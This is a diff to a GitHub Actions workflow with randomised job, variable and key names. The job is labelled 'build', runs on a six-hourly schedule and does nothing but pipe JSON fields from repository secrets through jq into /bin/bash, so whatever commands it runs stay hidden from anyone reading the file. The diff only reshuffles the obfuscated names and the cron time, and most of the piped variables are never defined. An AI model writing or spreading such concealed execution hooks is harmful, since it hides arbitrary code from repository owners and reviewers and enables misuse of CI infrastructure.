@@ -1,25 +1,25 @@
 name: xiezhen19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
-
+    - cron: '12 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiezhen19871010
         env:
-          fdiz328: ${{ secrets.fdiz328 }}
+          zrugr0: ${{ secrets.zrugr0 }}
         run: |
-          echo $fdiz328 | jq -r .bh1 | /bin/bash
-          echo $oeec50 | jq -r .ar0899 | /bin/bash
-          echo $fkwib42 | jq -r .bq1347 | /bin/bash
-          echo $qpswa41 | jq -r .i00 | /bin/bash
-          echo $vkq320 | jq -r .bzqao81301 | /bin/bash
-          echo $v0764 | jq -r .amcr61 | /bin/bash
-          echo $yl2615 | jq -r .rrr4772 | /bin/bash
-          echo $eudpp10 | jq -r .sy24865 | /bin/bash
-          echo $hud8931 | jq -r .oyrz39547 | /bin/bash
+          echo $zrugr0 | jq -r .vqo26362 | /bin/bash
+          echo $p47 | jq -r .si13 | /bin/bash
+          echo $z2 | jq -r .qvh42340 | /bin/bash
+          echo $j99 | jq -r .a276 | /bin/bash
+          echo $nk32929 | jq -r .kebs7 | /bin/bash
+          echo $vqiki55076 | jq -r .kmk60 | /bin/bash
+          echo $lqri27 | jq -r .m5434 | /bin/bash
+          echo $sij34843 | jq -r .htis30902 | /bin/bash
 
